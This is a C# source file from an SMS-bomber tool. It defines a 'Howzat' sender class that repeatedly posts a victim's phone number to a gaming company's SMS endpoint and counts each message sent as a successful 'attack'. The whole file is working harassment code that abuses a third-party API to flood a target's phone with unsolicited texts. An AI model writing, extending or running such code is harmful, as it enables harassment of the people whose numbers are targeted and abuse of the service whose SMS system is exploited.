using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace SMS_Bomber.Sender
{
    public class Howzat : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "Howzat";

        private readonly HttpClient Attacker = new HttpClient();
        private readonly Uri SendAPI = new Uri("https://connect.jungleerummy.com/canopus/api/send-howzat-sms");

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;
            var AtkMSG = new HttpRequestMessage(HttpMethod.Post, SendAPI)
            { Content = new FormUrlEncodedContent(new Dictionary<string, string> { { "mobile_number", To.ToString() } }) };

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("SMS sent!")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
